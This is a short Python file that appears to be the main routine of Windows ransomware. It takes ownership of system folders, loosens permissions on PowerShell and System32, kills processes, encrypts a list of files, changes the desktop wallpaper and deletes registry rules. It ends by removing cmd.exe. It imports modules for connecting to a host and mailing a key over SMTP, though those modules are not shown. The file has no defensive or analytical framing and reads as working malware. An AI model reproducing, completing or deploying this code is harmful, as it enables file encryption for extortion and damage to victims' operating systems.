#!/usr/bin/python
#coding:utf-8
from cryptography.fernet import Fernet
from modules.crypt import crypt
from modules.permission import takeown, icacls, get_admin_rights
from modules.system import killproc, regedit, set_wallpaper
from modules.network import host_connect, sendkey_smtp
import os, sys, socket, wget, struct, ctypes, shutil, winreg, time, ctypes

def getcrypt():
    takeown.tkOwn_process()
    takeown.tkOwn_DirWallpaper()
    takeown.tkOwn_SoftwareDir()
    icacls.icc_powershell()
    icacls.icc_sys32()
    killproc.pkill_smart()
    icacls.remove_proc()
    set_wallpaper.copy_img()
    crypt.filelist()
    try:
        set_wallpaper.change_wallpaper()
    except:
        pass
    crypt.filelist_aux()
    regedit.delSpecRules()
    regedit.delRules()
    # Delete cmd.exe last because he used for running the program
    os.remove("\\windows\\system32\\cmd.exe")
